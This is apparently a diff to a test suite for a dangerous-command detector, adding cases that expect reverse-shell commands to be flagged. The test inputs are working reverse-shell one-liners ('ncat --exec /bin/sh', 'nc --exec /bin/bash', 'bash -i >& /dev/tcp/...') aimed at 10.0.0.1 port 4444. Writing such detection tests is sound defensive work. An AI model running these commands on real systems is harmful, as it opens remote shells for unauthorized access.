@@ -101,6 +101,18 @@ describe('P4-1: Risk mitigation checks', () => {
       expect(result.rule?.id).toBe('rule-reverse-shell');
     });
 
+    it('should detect ncat --exec /bin/sh', () => {
+      const result = manager.detectCommand('ncat --exec /bin/sh 10.0.0.1 4444');
+      expect(result.isDangerous).toBe(true);
+      expect(result.rule?.id).toBe('rule-reverse-shell');
+    });
+
+    it('should detect nc --exec /bin/bash', () => {
+      const result = manager.detectCommand('nc --exec /bin/bash 10.0.0.1 4444');
+      expect(result.isDangerous).toBe(true);
+      expect(result.rule?.id).toBe('rule-reverse-shell');
+    });
+
     it('should detect bash -i reverse shell via /dev/tcp/', () => {
       const result = manager.detectCommand('bash -i >& /dev/tcp/10.0.0.1/4444 0>&1');
       expect(result.isDangerous).toBe(true);
